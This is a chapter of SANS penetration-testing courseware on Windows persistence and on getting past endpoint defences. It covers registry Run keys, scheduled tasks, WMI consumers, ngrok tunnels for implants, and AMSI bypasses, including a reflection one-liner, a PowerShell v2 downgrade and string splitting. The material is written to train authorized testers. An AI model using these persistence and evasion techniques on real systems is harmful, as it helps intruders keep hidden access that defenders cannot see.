# **SEC560 | ENTERPRISE PENETRATION TESTING GIAC Penetration Tester (GPEN)**

**560.5**

# Persistence and Evading Controls

![](_page_0_Picture_3.jpeg)

© 2025 SANS Institute. All rights reserved to SANS Institute.

PLEASE READ THE TERMS AND CONDITIONS OF THIS COURSEWARE LICENSE AGREEMENT ("CLA") CAREFULLY BEFORE USING ANY OF THE COURSEWARE (DEFINED BELOW) ASSOCIATED WITH THE SANS INSTITUTE COURSE. THIS IS A LEGAL AND ENFORCEABLE CONTRACT BETWEEN YOU (THE "USER") AND THE ESCAL INSTITUTE OF ADVANCED TECHNOLOGIES, INC. /DBA SANS INSTITUTE ("SANS INSTITUTE") FOR THE COURSEWARE. BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA.

With this CLA, SANS Institute hereby grants User a personal, non-exclusive license to use the Courseware subject to the terms of this CLA. Courseware means all printed materials, including course books and lab workbooks, slides or notes, as well as any digital or other media, audio and video recordings, virtual machines, software, technology, or data sets distributed by SANS Institute to User for use in the SANS Institute course associated with the Courseware. User agrees that the CLA is the complete and exclusive statement of agreement between SANS Institute and User and that this CLA supersedes any oral or written proposal, agreement or other communication relating to the subject matter of this CLA.

BY ACCESSING THE COURSEWARE, USER AGREES TO BE BOUND BY THE TERMS OF THIS CLA. USER FURTHER AGREES THAT ANY BREACH OF THE TERMS OF THIS CLA MAY CAUSE IRREPARABLE HARM AND SIGNIFICANT INJURY TO SANS INSTITUTE, AND THAT SANS INSTITUTE MAY ENFORCE THESE PROVISIONS BY INJUNCTION (WITHOUT THE NECESSITY OF POSTING BOND), SPECIFIC PERFORMANCE, OR OTHER EQUITABLE RELIEF.

If User does not agree to the terms of this CLA, User should not access the Courseware. User may return the Courseware to SANS Institute for a refund, if applicable.

User may not copy, reproduce, re-publish, distribute, display, modify or create derivative works based upon all or any portion of the Courseware, in any medium, whether printed, electronic or otherwise, for any purpose, without the express prior written consent of SANS Institute. User may not sell, rent, lease, trade, share, or otherwise transfer the Courseware in any way, shape, or form to any person or entity without the express written consent of SANS Institute. Additionally, User may not upload, submit, or otherwise transmit Courseware to any artificial intelligence system, platform, or service for any purpose, regardless of whether the intended use is commercial, educational, or personal, without the express written consent of SANS Institute. User agrees that the failure to abide by this provision would cause irreparable harm to SANS Institute that is impossible to quantify. User therefore agrees to a base liquidated damages amount of \$5000.00 USD per item of Courseware infringed upon or fraction thereof. In addition, the base liquidated damages amount shall be doubled for any Courseware less than a year old as a reasonable estimation of the anticipated or actual harm caused by User's breach of the CLA. Both parties acknowledge and agree that the stipulated amount of liquidated damages is not intended as a penalty, but as a reasonable estimate of damages suffered by SANS Institute due to User's breach of the CLA.

If any provision of this CLA is declared unenforceable in any jurisdiction, then such provision shall be deemed to be severable from this CLA and shall not affect the remainder thereof. A written amendment or addendum to this CLA that is executed by SANS Institute and User may accompany this Courseware.

SANS Institute may suspend and/or terminate User's access to and require immediate return of any Courseware in connection with any (i) material breaches or material violation of this CLA or general terms and conditions of use agreed to by User, (ii) technical or security issues or problems caused by User that materially impact the business operations of SANS Institute or other SANS Institute customers, or (iii) requests by law enforcement or government agencies.

SANS Institute acknowledges that any and all software and/or tools, graphics, images, tables, charts or graphs presented in this Courseware are the sole property of their respective trademark/registered/copyright owners, including:

The Apple® logo and any names of Apple products displayed or discussed in this book are registered trademarks of Apple, Inc.

PMP® and PMBOK® are registered trademarks of PMI.

SOF-ELK® is a registered trademark of Lewes Technology Consulting, LLC. Used with permission.

SIFT® is a registered trademark of Harbingers, LLC. Used with permission.

VMware Workstation Pro®, VMWare Workstation Player®, VMWare Fusion®, and VMware Fusion Pro® are registered trademarks of VMware, Inc. Used with permission.

Governing Law: This CLA shall be governed by the laws of the State of Maryland, USA.

Courseware licensed to User under this CLA may be subject to export laws and regulations of the United States of America and other jurisdictions. User warrants he or she is not listed (i) on any sanction programs list maintained by the U.S. Office of Foreign Assets Control within the U.S. Treasury Department ("OFAC"), or (ii) denied party list maintained by the U.S. Bureau of Industry and Security within the U.S. Department of Commerce ("BIS"). User agrees to not allow access to any Courseware to any person or entity in a U.S. embargoed country or in violation of a U.S. export control law or regulation. User agrees to cooperate with SANS Institute as necessary for SANS Institute to comply with export requirements and recordkeeping required by OFAC, BIS or other governmental agency.

![](_page_2_Picture_0.jpeg)

![](_page_2_Picture_1.jpeg)

# **Persistence and Evading Controls**

ENTERPRISE PENETRATION TESTING

![](_page_3_Figure_0.jpeg)

![](_page_4_Figure_0.jpeg)

![](_page_5_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

- Golden Ticket
  - Lab 5.4: Golden Ticket
- Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_6_Picture_1.jpeg)

# **Why Persistence**

- Persistence (normal definition): Keeping access through reboots
- Persistence (more abstractly): Surviving defenders' actions
  - − There are multiple ways to do persistence
  - − Common ways include:
    - Registry changes
    - Writing to Startup Folders
    - Scheduled Tasks
    - Windows Services
    - WMI Event Consumers

Maintaining access to a compromised system is critical for a successful attack. The goal is to ensure that even if the system is rebooted or the defender takes action, the attacker still has access to the compromised system.

There are several ways to achieve persistence on a target system. Attackers use these methods to keep their tools, backdoors, or malicious payloads running on the target system, even after a reboot.

Common persistence methods include registry changes, writing to startup folders, creating a scheduled task, installing a malicious Windows service, and using WMI Event Consumers. These methods allow the attacker to execute their payloads automatically when the system starts, ensuring they have access to the target system even if the system reboots.

# Recommended reading:

- https://persistence-info.github.io
- https://twitter.com/vysecurity/status/1600013028615147520

![](_page_7_Picture_0.jpeg)

![](_page_7_Picture_1.jpeg)

# **Registry**

The registry is a rich location for hiding persistence methods, and HKCU (Current User) is editable by the current user.

- Malware often maintains persistence in the same way
- HKCU (Current User) Run and RunOnce registry keys **HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce**
- CMD.EXE AutoRun—when CMD.EXE starts, it looks for registry variables to execute first

**HKCU\Software\Microsoft\Command Processor\AutoRun**

• HKCU Load—not used in modern Windows, but still supported **HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows**

The registry is a database of configuration information stored in Windows operating systems. It contains information about installed software, user settings, system settings, and other information that is essential to the functioning of the operating system. The registry is often used by malware to maintain persistence on an infected machine—though persistence outside of the registry is also possible in a number of ways.

One common location for persistence in the registry is the HKCU (Current User) section. This section is editable by the current user and can be used to run commands or programs automatically when the user logs in. The HKCU section contains two keys that are often used for persistence: the Run key and the RunOnce key. The Run key is used to run commands or programs automatically every time the user logs in, while the RunOnce key is used to run a command or program only once, the next time the user logs in.

Another way to use the registry for persistence is through the CMD.EXE AutoRun key. CMD.EXE is the command-line interpreter in Windows, and it looks for registry variables to execute first when it starts. The HKCU\Software\Microsoft\Command Processor\AutoRun key is used to run a command or program automatically every time CMD.EXE starts. The HKCU Load key is an older method of using the registry for persistence, but it is still supported in modern Windows operating systems.

![](_page_8_Picture_1.jpeg)

# **Startup Folder**

Any executable, link, or script in the current user's Startup Folder is launched upon login.

- Folder location **%AppData%\Microsoft\Windows\Start Menu\Programs\Startup**
- Location is editable by the current user
- One example of a persistence mechanism without involving the Windows registry
- Notably, this location is likely to work even in a virtual desktop environment where user profiles are copied to fresh VMs upon each login

The Startup Folder is a location in a Windows operating system where any executable, link, or script present in it is launched upon login. The folder is located at %appdata%\Microsoft\Windows\Start Menu\Programs\Startup and is editable by the current user. This location serves as an example of a persistence mechanism that does not involve the Windows registry. It is worth noting that the Startup Folder is likely to work even in a virtual desktop environment where user profiles are copied to fresh virtual machines upon each login.

# **Scheduled Task**

Scheduled tasks can be used to execute code of your choosing at regular intervals or on certain events, such as login.

• Syntax:

C:\> **schtasks /create /tn** *[taskname]* **/s** *[target]* **/u** *[user]* **/p** *[password]* **/sc** *[frequency]* **/st** *[starttime]* **/sd** *[startdate]* **/tr** *[command]*

- Frequency can be MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY, or ONCE
- The repetition interval for the scheduled task can be ONSTART, ONLOGON, ONIDLE
- The schtasks command allows for alternate credentials, or it can run as SYSTEM

The schtasks command syntax looks like this:

C:\> schtasks /create /tn [taskname] /s [targetIP] /u [user] /p [password] /sc [frequency] /st [starttime] /sd [startdate] /tr [command]

The starttime must be in HH:MM:SS format, or the command will fail. The frequency (specified with /sc) can be any one of numerous settings to make the job run repeatedly, including MINUTE, HOURLY, DAILY, and so on.

The task can also be scheduled to run on an event, such as ONSTART, ONLOGON, or ONIDLE.

To use schtasks to run a command as a local SYSTEM instead of as an individual user, we use the /ru SYSTEM syntax in the invocation.

After you schedule the job, you should verify that it is scheduled to run, again using schtasks as follows:

C:\> schtasks /query /s [targetIP]

The schtasks /query command shows all items scheduled through the scheduler service.

![](_page_10_Picture_2.jpeg)

# **Services**

- Services are background processes, often starting with the OS w/o user login
  - − Services can run as any user (though credentials must be stored) or even SYSTEM
  - − If a service runs as a user account, by compromising that host we can steal those plaintext credentials via Impacket's secretsdump.py and registry hives
- OPSEC beware! Service creation is often carefully observed. We have some options:
  - − Poor: Creating a randomly-named new service
  - − Good: Create a service that blends in (same details as services on other hosts)
  - − Great: Hijacking an existing service (DLL search order hijacking, replacing or adding functionality to the existing executable, etc)

Services are powerful persistence tools because they are background processes that launch with the OS, requiring no user login. They can run as SYSTEM or as a user, but a service running as a user risks having its credentials stolen from registry hives via tools like Impacket's secretsdump.py.

Since service creation is heavily monitored, OPSEC is critical. Creating a randomly-named service is poor practice. A good approach is to create a service that blends in with others on the host. A very good option is hijacking an existing service through methods like DLL search order hijacking or by modifying its executable.

![](_page_11_Picture_0.jpeg)

![](_page_11_Picture_1.jpeg)

#### **WMI Event Consumer**

WMI persistence lets us execute code upon arbitrary criteria:

- The trigger could be as simple as a user login
- A more advanced trigger could be to detect a failed logon for a distinct username, allowing remote triggering via any authentication protocol (such as Remote Desktop, PsExec, local runas, and more)
- Imagine adding persistence to a domain controller now you can trigger the persistence mechanism using any AD-integrated service, even across the internet!

WMI (Windows Management Instrumentation) event subscription is a feature in the Windows operating system that allows administrators or attackers to execute code based on certain events. The trigger events can be customized to suit specific needs, ranging from simple events, such as user login, to more complex events, such as detecting a failed logon for a specific username.

This advanced trigger event allows for remote triggering of code execution via any authentication protocol, such as Remote Desktop, PsExec, local runas, and others. By using WMI event subscriptions, an attacker can establish persistence on a target system and execute code whenever a specified event occurs, allowing them to maintain control over the compromised system.

![](_page_12_Figure_0.jpeg)

Understanding how machine learning, and particularly Large Language Models (LLMs) like ChatGPT, learn is crucial for grasping their capabilities and limitations. The process is analogous to how humans learn language. When humans begin to learn language, they don't start with grammar rules. Instead, they listen to countless examples and, over time, reverse-engineer the rules. English, for instance, is notorious for its many exceptions to its own rules, which learners pick up over time through exposure and practice.

Similarly, LLMs learn from vast amounts of text data. They are trained to predict the next word in a sequence based on the patterns they've seen in their training data. The more data they're exposed to, the better they become at this task. To put the scale of training data into perspective:

The complete works of Shakespeare, which is often cited as a significant body of text, is only 5 MB.

By the age of 40, a human might have read an equivalent of 1-6 GB of text. This is based on a rough calculation considering a lower bound reading speed of 250 words per minute and reading for an hour a day from ages 10 to 40. This equates to roughly 1 GB. If we consider faster reading speeds and more hours spent reading daily, this number can increase.

In contrast, LLMs are trained on much larger datasets. Common Crawl, an archive of web data, is 240 GB. The Pile, a composite dataset used for training some LLMs, is even larger at 886 GB. This dataset amalgamates various sources, some of which are depicted in the slide.

In essence, while humans learn from a limited amount of data they're exposed to over their lifetime, LLMs have the advantage of being trained on vast datasets, encompassing a wide range of topics and styles. This extensive training allows them to generate diverse and nuanced responses, but it's also essential to remember that their knowledge is bounded by the data they've been trained on.

#### References:

- Great video explaining ChatGPT explicitly: https://www.youtube.com/watch?v=-4Oso9-9KTQ
- An article going into similar depths: https://writings.stephenwolfram.com/2023/02/what-is-chatgptdoing-and-why-does-it-work/
- ChatGPT shared session from the screenshot: https://chatgpt.com/share/29cf176b-3aee-433a-8ae8- 81d8fb8ae795

![](_page_14_Picture_0.jpeg)

![](_page_15_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

# **Living Off Trusted Sites (LOTS) Project**

- Borrowing the trust of legitimate domains (such as Ngrok, GitHub, Dropbox, Cloudflare, or Microsoft) to evade detection
- Attackers can abuse these sites for C2, exfiltration, hosting payloads, and more −If a victim can cause an observable change, it can be abused for C2
- Bonus: Removes the requirement for your own public IP/domain

![](_page_16_Picture_6.jpeg)

![](_page_16_Picture_7.jpeg)

The Living Off Trusted Sites (LOTS) project documents the potential for attackers to use third-party trusted infrastructure instead of providing their own. This helps the traffic to better blend into environments (imagine exfiltrating data via Dropbox instead of via a DigitalOcean C2 server) as well as removes the need for the attacker to provide their own infrastructure. Since the attacker is now one step removed from what the victim sees, this can also make the defender's job of attribution more difficult.

#### Reference:

• https://lots-project.com/

# **Introduction to Ngrok**

- Ngrok allows us to expose local/internal ports to the internet
- Can be used for simple testing or, in some cases, penetration testing and assessment
  - − Always remember to encrypt payloads and communications
  - − Never treat providers as you would a VPN

![](_page_17_Picture_7.jpeg)

to expose local or internal services to the internet. The heart of the ngrok system is the ngrok agent. The agent will connect to the ngrok cloud and provide the end user with a connectivity method. We can leverage ngrok to facilitate connectivity for our implants or backdoors. What's a valid use case for ngrok? How about a service like Google Home or Amazon Alexa? If you wanted to build an application for those systems, you would need to host the code in a way that's reachable by those home assistants. Ngrok can facilitate that access to expose your code from your workstation to the internet in an accessible way. Can this be a security issue? Yes. Can we securely do this? Yes.

We cannot have a directly exposed server to the internet in the next set of labs. Consider what we have been doing in class so far. The servers and clients we have been hacking were laterally available to us; we could connect in both directions because we were effectively behind the firewall or on the same LAN. We do not have access laterally; our systems are behind firewalls and NAT interfaces. We can use ngrok to bypass this restriction.

![](_page_18_Picture_2.jpeg)

#### **How Does It Work?**

Ngrok supports several types of tunnels:

- HTTP tunnels (including HTTPS): Give you a reverse proxy connection
- TCP tunnels: Forward raw sockets
- SSH port forwarding: No ngrok client needed; just connect to SSH

| \$ ngrok http 8080                                 | Forwards connections from outside to<br>localhost port 8080 |
|----------------------------------------------------|-------------------------------------------------------------|
| \$ ngrok tcp 4444                                  | Forwards connections from outside to<br>localhost port 4444 |
| \$ ssh -R 80:localhost:80 tunnel.us.ngrok.com http | Starts the ngrok client at ngrok                            |

Ngrok establishes a tunneled connection from within an environment out to the internet. The ngrok agent supports several tunnels to provide connectivity back to the client. Ngrok has a paid-for and free service; we always recommend that you pay for a service like this for a commercial engagement. The pay-for features make the system much more secure and operationalized than you will see in this demonstration.

# **Tunnel Types**

While we will go over how this happens, we will start by describing the types of connections you can make from within an environment to the internet.

The first type is an HTTP tunnel, which works much like an HTTP reverse proxy. Your agent establishes an outbound connection that will then be granted a set of addresses proxied to your local web server.

You start the agent by typing **ngrok HTTP** *port*, replacing *port* with a number like 8000.

The second tunnel type is a normal TCP socket connection. This tunnel type requires that you have a valid authenticated session and are registered with ngrok. The TCP tunnel will establish an outbound connection on your host and then establish an open session in the ngrok cloud. This time, instead of getting a reverse proxy connection, as you would with HTTP, you are getting a raw TCP socket. The socket connection will be displayed to you, and a port forward will exist.

You start the agent by typing **ngrok tcp** *port*, replacing *port* with a number like 4444.

The third type of tunnel is rather interesting. Instead of establishing a connection with the ngrok agent, you use SSH to reverse-port-forward the connection. The command to connect via SSH will run the ngrok agent on the ngrok cloud. This can then facilitate all standard tunnel types but will use SSH to connect from the host to the internet. This may even evade content filters that try to block ngrok connections.

You start the agent by typing **ssh -R 80:localhost:80 tunnel.us.ngrok.io http**. Notice that the **http** part is running on the remote ngrok cloud, as if it were a command.

![](_page_19_Picture_0.jpeg)

To create a connection using ngrok, we follow a flow that will establish the listener connection. On the tester workstation, you will need to have the ngrok client and, in this example, the listening service. Our first step will be to turn on a listening server, which is a Python web server in this example:

#### \$ python3 -m http.server 8080

The listener is now running on port 8080 on all interfaces, including localhost. We will start a new window with the ngrok client now that this is done:

# \$ ngrok HTTP 8080

The command we are running will connect to the ngrok cloud to establish a connection. Every packet that is sent to the ngrok address in the cloud will be forwarded locally to port 8080, which is our Python listener. This will allow us to connect our internal python3 web server to the internet.

Pay attention to the window that ngrok keeps open for agent connection. There are several items we want to focus on. The first one is the redirection addresses we are given. We will be given both an HTTP and HTTPS address for an HTTP listener. The addresses you see ending in ngrok.io are available on the internet. You may also see a local ngrok listener on port 4040 that will serve as a logging system. At the bottom of the screen, you will see diagnostic information. For TCP-only connections, you will see open and closed sessions. For HTTP connections, you will see the URLs that have been requested. This is helpful for troubleshooting connectivity.

![](_page_20_Figure_0.jpeg)

This graphic depicts how ngrok works to provide tunnels bypassing restrictions. Ngrok itself is an agent. The agent offers a full TCP tunnel connection to the ngrok cloud. TCP traffic is bidirectional, which means that having an open connection outbound from your machine to the cloud will establish a firewall connection and a NAT connection. This act will bypass restrictions that both NAT and firewalling offer. Once the connection is established, the ngrok system will forward traffic that it receives to your connection.

In the above graphic, the agent connection is started by typing the following command: **ngrok HTTP 443**. This will open a connection outbound to the ngrok system. The ngrok system will provide the HTTP URL to the agent that an external third party can connect to in order to send data back to the ngrok agent. The far-end system goes to the following URL: HTTP://abc123.ngrok.io. This will send traffic to the ngrok cloud, which gets redirected back to the agent listening for a connection. Whatever is listening on that device's interfaces on port 443 will now be reachable over the internet. If this is an implant or a netcat shell, you will receive the connection from the internet to your device. Since our labs are in Azure, this will help us perform our attacks.

![](_page_21_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

# **AV/EDR Evasion Tactics**

- AV/EDR software may block your payload or the method you use to load it
  - − Email, website upload, file sharing software, USB drive, or cloud storage
  - − Exploit or upload/execution
- Pen testers often need to evade protections to achieve their goals
- Multiple approaches to preventing AV/EDR detection
  - − Shut down AV/EDR—in lab environments only!
  - − Encoding the malware so it doesn't match signatures
  - − Directly loading malware into memory without touching the file system
  - − Custom compilation with various options

In previous labs in this course, we sent malicious payloads to a target machine. For these labs, an antivirus

via email, a website, a USB drive, or another mechanism, an antivirus tool could have blocked execution.

To properly model the actions of real-world computer attackers, penetration testers need the ability to evade detection by antivirus tools. There are multiple different approaches to evading malware, but not all of them are equal. Here are the commonly used methods:

**Shut down the antivirus software:** For most penetration tests, this approach is NOT recommended, as it could expose the system to unnecessary risk from malicious attackers. This approach is fine in lab environments, however.

**Encoding malware so it doesn't match signatures:** This technique involves modifying the malicious file in a systematic way, applying a round of encoding or even encryption, and then applying a decoding/decrypting header in front of it. The resulting malware file will not match the signature of antivirus tools. When the file runs, the header decodes the rest of the file as it loads into memory.

**Directly loading malware into memory:** This technique involves dodging antivirus tools that focus on detecting malware in the file system. By inserting the malware into memory directly without touching the file system, we have a better chance of gaining execution without the antivirus tool noticing.

**Custom compile the malware:** By custom compiling the malware from source code and choosing different instructions and different compiler options, the resulting malware likely won't match the antivirus signature.

# **Approach for Evading AV/EDR**

- You don't need to dodge every possible AV/EDR product
  - − You need to evade only the one or two used by the target organization
- Some recon helps here immensely
  - − What AV tool or endpoint protection suite does it use?
  - − It's worthwhile to at least ask, conduct recon, or possibly use social engineering to determine the answer
- Then purchase that AV/EDR product, install it in your lab, and work to evade it
  - − Build multiple different malicious files and measure how each performs
  - − Then choose the best, and use it for your attack in that pen test

A really important concept for penetration testers to understand is that to be effective, they *do not* have to evade every possible antivirus tool for every single test. Having such a goal is overkill, as the target organization likely relies on only one or two different antivirus products. You can save a lot of time, money, and effort if you focus exclusively during that penetration test on evading the specific antivirus products the target uses.

To determine the particular antivirus product used by the target organization, good reconnaissance helps a lot.

Another quite effective approach is to simply ask. Target system personnel may tell you which antivirus tool they use during your scoping and formulation or the Rules of Engagement. Or you may apply some social engineering (when it is allowed in the scope), calling users and asking them about the antivirus product they use on their machines. Numerous social engineering approaches are possible for this, including posing as tech support and helping the user troubleshoot a problem.

Once you've determined which antivirus product(s) the target organization is using, you should procure a copy of as close a version as you can and install it in your lab. Then, build multiple malicious files and see how each performs against the target organization's antivirus tool in your lab. Choose the best one and use it for your attack on that penetration test.

![](_page_24_Figure_0.jpeg)

− Rather self-defeating for pen testers

AV/EDR vendors and all customers

- There are other online scanners, some of which let you opt out of sharing
  - − These sites appear and disappear frequently
  - − You are better off buying a copy of the target's AV tool

![](_page_24_Picture_5.jpeg)

Some people think that an effective way to evade antivirus tools is to use the virustotal.com website, which hosts more than 50 different antivirus tools and enables users to upload files to see which AV tool detects the file as malware. It can indeed be exciting to formulate a malicious executable, upload it to virustotal.com, and see that zero or only two to five antivirus tools out of 50+ products detected it as malware.

However, such an approach undercuts the penetration tester's own ability to model what a real-world malicious attacker would do. The virustotal.com website is set up to share any received samples with the antivirus vendors who participate in its service. That is, when you upload a file, you are not merely measuring whether antivirus tools can detect it. You are also providing that file to antivirus vendors who can then create a signature and block that file from executing going forward, which could severely limit your penetration test a few days in the future when your malicious files suddenly and unexpectedly stop working on the target environment.

It should be noted that virustotal.com does include a search utility, so you can send it a hash of the file (instead of the file itself) to see if it matches the hashes of any known malware. Although that is interesting for research purposes, this feature is a limited indication of whether your file will run on a target protected by the antivirus solution. A simple hash that you send may or may not match the items looked for by the antivirus solution in detecting your file.

Several other online antivirus scanners are available in addition to virustotal.com, some of which have a policy of NOT sharing with antivirus vendors. However, these smaller sites tend to appear and then disappear after a few months and often do not host the most popular enterprise antivirus solutions. Therefore, you are usually better off buying a copy of the target's antivirus tool and running it in your laboratory rather than using these services, especially virustotal.com.

![](_page_25_Picture_2.jpeg)

# **AV/EDR Evasion**

Defensive tools use Static and Dynamic analysis to find "bad"

# **Static**

- Signature-based
- Looking for bad strings in:
  - − API Calls
  - − Anti-Malware Scanning Interface (AMSI)

# **Dynamic**

- Runtime analysis
  - − Hooked API calls
- Behavioral analytics
  - − Observe what the binary does inside a pseudo-VM for a short time

Easier to write rules, easier to bypass Harder to write rules, harder to bypass

Defensive tools, such as AV and EDR, identify bad executables or execution using static and dynamic analysis.

Static analysis is easy to write rules against. Defensive tool developers can look for specific strings or text or file hashes that are associated with previously known bad software. The strings are identified in API calls and hooks in both userland and the kernel. The Anti-Malware Scanning Interface (AMSI) is a Windows feature that offers defensive tools a nice way to look at this type of information. The problem with static detection is that it is fragile. A single bit change in a string means the match fails and the detection fails.

Dynamic analysis looks at what the process does and determines if it is a normal user action. Since there are so many different users and software packages, it can be difficult to properly tune these types of detections and cause many false positives. False positives can overwhelm a security team, but more importantly, they could impair or break critical business processes.

![](_page_26_Picture_1.jpeg)

#### **AMSI**

- Part of Windows 10 / Server 2016 and above
- Allows defensive tools to look into what is happening on the system
  - − User Account Control, or UAC
  - − PowerShell (scripts, interactive use, and dynamic code evaluation)
  - − Windows Script Host (wscript.exe and cscript.exe)
  - − JavaScript and VBScript
  - − .NET Assemblies (4.8+)
  - − Office VBA macros
- No tool, not even AMSI can track everything
  - − This is the key to evasion
- AMSI Reference: https://redsiege.com/560/amsi-help

Antimalware Scan Interface (AMSI) was first introduced with Windows 10 and Windows Server 2016. AMSI allows defensive tools to look into parts of the operating system that were previously much more opaque. The tools can see what is happening with:

- User Account Control, or UAC
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros
- .NET code (for .NET 4.8 and above): https://learn.microsoft.com/en-us/dotnet/framework/whatsnew/#common-language-runtime

While this additional visibility is very useful for defensive tools, it still isn't perfect. No tool can track 100% of the actions taken, and even if it could, it would drastically degrade the performance of the system. The key to evasion is identifying these gaps.

#### Reference:

• https://redsiege.com/560/amsi-help

![](_page_27_Picture_2.jpeg)

# **AMSI Initialization in PowerShell**

- When a new process is created, the AMSI DLL is mapped into the virtual address space of the process.
- If AMSI initialization fails, the process continues to execute.
- If the AmsiScanBuffer function can be disabled, the process continues to execute, and AMSI is effectively disabled.

When a new PowerShell process is created, the AMSI dll (C:\Windows\System32\amsi.dll) is loaded into the process memory space. This is important because if the DLL is loaded into the process's own memory space, that memory can be controlled by the process.

AMSI is initialized by calling the ScanContent() function. If initialization fails, the PowerShell script will continue to execute. Some AMSI bypasses patch the AMSI DLL in memory, causing ScanContent to return an error, allowing script execution to continue. Other bypasses work by disabling the AmsiScanBuffer() function. If this function is disabled, AMSI is effectively disabled, allowing a malicious script to be executed.

![](_page_28_Picture_1.jpeg)

# **Bypassing AMSI: AMSI Initialization**

AMSI may fail during initialization. When this happens, AMSI fails open, allowing execution to continue.

In 2016, by reviewing the PowerShell source code, Matt Graeber identified an AMSI bypass related to AMSI initialization. When the AMSI ScanContent function is called to scan content, it returns one of two statuses.

- AMSI\_RESULT\_NOT\_DETECTED The sample is not considered malicious
- AMSI\_RESULT\_DETECTED The sample is considered malicious

If something were to fail during AMSI initialization, AMSI is designed to fail open by setting a variable, s\_amsiInitFailed, to 'True'. When this occurs, ScanContent returns a status of AMSI\_RESULT\_NOT\_DETECTED.

This means the malicious code will not be detected by the system. Because the AMSI DLL is mapped into the PowerShell process memory, it can be modified by scripts running in PowerShell. In Matt's bypass, s\_amsiInitFailed is set to True using the following code:

GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true).

Recent bypasses have used a C# DLL embedded in a PowerShell script to patch the AmsiScanBuffer function, causing it to return "S\_OK", indicating no problems were found with the scanned content.

The PowerShell source code can be found in the PowerShell GitHub repository: https://github.com/PowerShell/PowerShell

# **Bypassing AMSI: Downgrade Attacks**

AMSI was introduced in PowerShell version 3. Previous versions do not include AMSI.

```
"amsiutils" is signatured, causing this to 
be identified as malicious
PS version 2 does not have AMSI. This is 
an AMSI bypass!
```

AMSI was introduced in PowerShell version 3. If previous versions of PowerShell exist on a system, they can be used to "bypass" AMSI protections. Microsoft has written signatures for many of the common strings used in AMSI bypasses. In the first example, the string "amsiutils" was detected as malicious by Windows Defender.

Because AMSI was introduced in PowerShell version 3, previous versions of PowerShell do not have AMSI integration. We can use this to effectively bypass AMSI. In the second example, we can see that the same command is executed, but PowerShell version 2 is specified using the -Version flag. As you can see, "amsiutils" was allowed to execute, meaning our code was not detected by AMSI.

AMSI bypasses can be used to allow our attack scripts to run on systems. Of course, we still must contend with AV/EDR agents on a system.

![](_page_30_Picture_1.jpeg)

# **Bypassing AMSI: String Modification**

Different character encodings, string concatenation, and manipulation can all lead to AMSI bypasses.

AV vendors attempt to block malicious code by analyzing static indicators like strings. In this example, Windows Defender attempts to block scripts containing the word "Invoke-Mimikatz", used in the PowerShell implementation of Mimikatz. Using a string with the content "Invoke-Mimikatz" is blocked. However, by concatenating the string together, each part isn't considered malicious, thus bypassing AMSI detective controls.

![](_page_31_Picture_1.jpeg)

# **Static Analysis Evasion**

Certain strings are associated with "good" and "bad" software.

- **Bad:** "Copyright Benjamin Delpy" (the creator of Mimikatz)
- **Good:** "SteamGameServer\_RunCallbacks" (from video games)

![](_page_31_Picture_6.jpeg)

Certain strings (text) in a file (typically executable or script) are signatured as being bad. Defensive tools will key in on those strings and flag the file as malicious. To make better choices and to lower the rate of false positives, the tools will also detect good strings from known good files. The two metrics are combined to give the file a final score.

The defensive tool then decides if the file should be quarantined or not.

Researchers from Skylight Cyber took the strings from Rocket League, a (quite fun) video game where cars play soccer/football, and used them in their C2 payload. Cylance then scored the file as safe and let the execution continue, thereby bypassing the protection.

The full article is available at https://redsiege.com/560/cy-kill.

![](_page_32_Picture_0.jpeg)

![](_page_32_Picture_1.jpeg)

# **Stripping PowerShell Comments**

- Some AV/EDR may trigger on words in comment blocks
- Comments don't affect execution (by definition) but can still be scanned by AMSI
- Remove comments manually (a pain) or programmatically
- PowerStripper
  - − https://github.com/fullmetalcache/PowerStripper

C:\> **PowerStripper.exe script\_with\_comments.ps1**

• PowerSploit's Remove-Comments

PS C:\> **Remove-Comments bad.ps1 | Out-File -Encoding ASCII good.ps1**

Some AV/EDR search for specific words (Mimikatz, harmj0y, Will Schroeder, etc.), often contained in comment blocks, to determine if a script is malicious. Unsurprisingly, removing all comments from a script can often be all that is required to get around detection. While comments can be removed manually, this is a chore to do by hand.

There are several options to remove comments programmatically before transferring your payload to the target system.

